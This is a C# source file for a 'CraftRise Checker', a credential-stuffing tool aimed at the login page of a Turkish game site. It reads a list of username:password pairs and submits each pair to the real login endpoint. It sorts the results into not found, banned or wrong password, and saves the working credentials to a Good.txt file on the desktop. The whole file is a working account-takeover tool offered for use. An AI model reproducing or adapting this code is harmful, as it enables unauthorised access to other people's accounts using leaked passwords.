using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;
using Newtonsoft.Json.Linq;

namespace CraftRise_Checker
{
    class Program
    {
		private static string file;
        private static int bad;
        private static int good;
		private static int notfound;
		private static int ban;
		private static int count;
		private static int checkedcount;


		static void Main(string[] args)
        {
			Console.Title = "CraftRise Checker";
			Console.ForegroundColor = ConsoleColor.Magenta;
			Console.WriteLine(@"

                     █████╗ ██████╗     █████╗ ██╗  ██╗███████╗ █████╗ ██╗  ██╗███████╗██████╗ 
                    ██╔══██╗██╔══██╗   ██╔══██╗██║  ██║██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
                    ██║  ╚═╝██████╔╝   ██║  ╚═╝███████║█████╗  ██║  ╚═╝█████═╝ █████╗  ██████╔╝
                    ██║  ██╗██╔══██╗   ██║  ██╗██╔══██║██╔══╝  ██║  ██╗██╔═██╗ ██╔══╝  ██╔══██╗
                    ╚█████╔╝██║  ██║   ╚█████╔╝██║  ██║███████╗╚█████╔╝██║ ╚██╗███████╗██║  ██║
                     ╚════╝ ╚═╝  ╚═╝    ╚════╝ ╚═╝  ╚═╝╚══════╝ ╚════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝



");
			try
			{
				if (args[0].Length > 0)
                {
					file = args[0];
					count = File.ReadAllLines(file).Length;
                }
                else
                {
					file = string.Empty;
                }
			}
            catch
			{
				file = string.Empty;
			}
			Console.ForegroundColor = ConsoleColor.DarkYellow;
			Console.Write(DateTime.Now.ToString("[hh:mm:ss] "));
			Console.ResetColor();
			Console.Write("Combolist: ");
			if(file.Length > 0)
            {
				Console.Write(file);
            }
            else
            {
				file = Console.ReadLine();
				count = File.ReadAllLines(file).Length;
			}
			Console.WriteLine("\r\n");
			Task.Run(Check);
			Console.Read();
		}

		public static async Task Check()
		{
			foreach (string line in File.ReadLines(file))
			{
				HttpClient client = new HttpClient();
				_ = client.GetStringAsync("http://api.ipify.org/").Result;
				string[] array = line.Split(':');
				string userName = array[0];
				string password = array[1];
				List<KeyValuePair<string, string>> body = new List<KeyValuePair<string, string>>
			{
				new KeyValuePair<string, string>("value", userName),
				new KeyValuePair<string, string>("password", password)
			};
				string exec = await (await client.PostAsync("https://www.craftrise.com.tr/posts/post-login.php", new FormUrlEncodedContent(body))).Content.ReadAsStringAsync();
				JObject json = JObject.Parse(exec);
				json.GetValue("resultMessage").ToString();
				if (exec.Contains("Böyle bir kullanıcı bulunamadı."))
				{
					checkedcount++;
					notfound++;
					Console.Title = $"CraftRise Checker | Bad: {bad} | Good: {good} | Ban: {ban} | Not found: {notfound} | {checkedcount}/{count}";
					Console.ForegroundColor = ConsoleColor.DarkYellow;
					Console.Write(DateTime.Now.ToString("[hh:mm:ss] "));
					Console.ForegroundColor = ConsoleColor.DarkGray;
					Console.WriteLine("[NOT FOUND] " + userName + " ");
					continue;
				}
				if (exec.Contains("Bu hesap engellenmiş, giriş yapamazsınız."))
				{
					checkedcount++;
					ban++;
					Console.Title = $"CraftRise Checker | Bad: {bad} | Good: {good} | Ban: {ban} | Not found: {notfound} | {checkedcount}/{count}";
					Console.ForegroundColor = ConsoleColor.DarkYellow;
					Console.Write(DateTime.Now.ToString("[hh:mm:ss] "));
					Console.ForegroundColor = ConsoleColor.Red;
					Console.WriteLine("[BAN] " + userName + " ");
					continue;
				}
				if (exec.Contains("Şifre yanlış."))
				{
					checkedcount++;
					bad++;
					Console.Title = $"CraftRise Checker | Bad: {bad} | Good: {good} | Ban: {ban} | Not found: {notfound} | {checkedcount}/{count}";
					Console.ForegroundColor = ConsoleColor.DarkYellow;
					Console.Write(DateTime.Now.ToString("[hh:mm:ss] "));
					Console.ForegroundColor = ConsoleColor.DarkRed;
					Console.WriteLine("[BAD] " + userName + " ");
					continue;
				}
				string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				checkedcount++;
				good++;
				Console.Title = $"CraftRise Checker | Bad: {bad} | Good: {good} | Not Found: {notfound} | {checkedcount}/{count}";
				Console.ForegroundColor = ConsoleColor.DarkYellow;
				Console.Write(DateTime.Now.ToString("[hh:mm:ss] "));
				Console.ForegroundColor = ConsoleColor.Green;
				Console.WriteLine("[GOOD] " + userName + " ");
				FileStream fs = new FileStream(path + @"\Good.txt", FileMode.OpenOrCreate, FileAccess.Write);
				fs.Close();
				File.AppendAllText(path + @"\Good.txt", userName + ":" + password + "\r\n");
			}
		}

	}
}